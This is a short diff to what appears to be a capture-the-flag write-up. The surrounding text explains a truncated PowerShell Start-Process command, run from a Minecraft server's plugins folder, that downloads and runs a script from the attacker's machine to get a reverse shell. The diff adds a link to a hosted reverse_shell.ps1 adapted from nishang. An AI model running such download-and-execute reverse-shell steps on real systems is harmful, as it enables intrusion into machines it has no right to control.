@@ -44,6 +44,6 @@ PS C:\Users\svc_minecraft\server\plugins> Start-Process -FilePath "powershell" -
 what we have done so above is that we  have initilize the process that will execute the download a powershell script from our machine and execute it and we get a reverse shell
 
 
-N/B: This powershell script is from nishang but also you can get it from here
+N/B: This powershell script is from nishang but also you can get it from here - [reverse-shell](https://github.com/alien-keric/powershell/blob/main/reverse_shell.ps1)
 
 
